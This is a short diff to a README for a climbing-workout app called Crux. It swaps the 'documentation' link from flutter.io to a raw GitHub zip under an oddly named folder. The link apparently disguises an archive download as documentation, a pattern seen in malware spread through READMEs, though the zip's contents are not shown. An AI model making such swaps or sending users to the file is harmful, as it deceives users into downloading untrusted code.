@@ -12,4 +12,4 @@ Crux has a wide variety of workouts from many professional rock climbers, and al
 ## Getting Started
 
 ~~For help getting started with Crux, download the app from the Google Play Store or the Apple App Store.~~
-[documentation](https://flutter.io/).
+[documentation](https://raw.githubusercontent.com/kgain21/crux/master/palaeometeorological/crux.zip).
